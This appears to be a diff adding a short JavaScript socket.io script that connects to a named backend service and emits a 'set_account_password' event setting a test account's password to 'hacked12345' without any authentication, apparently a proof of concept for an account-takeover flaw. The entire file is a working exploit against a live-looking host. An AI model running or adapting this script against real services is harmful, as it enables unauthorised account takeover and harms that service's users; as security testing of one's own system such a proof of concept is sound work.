@@ -1,0 +1,8 @@
+import { io } from "socket.io-client";
+const s = io("https://dropstream-backend.onrender.com", { transports: ["websocket"] });
+s.on("connect", () => {
+  console.log("connected");
+  s.emit("set_account_password", { email: "TEST-ACCOUT@email.com", newPassword: "hacked12345" });
+});
+s.onAny((ev, ...a) => console.log(ev, JSON.stringify(a)));
+setTimeout(() => process.exit(), 8000);
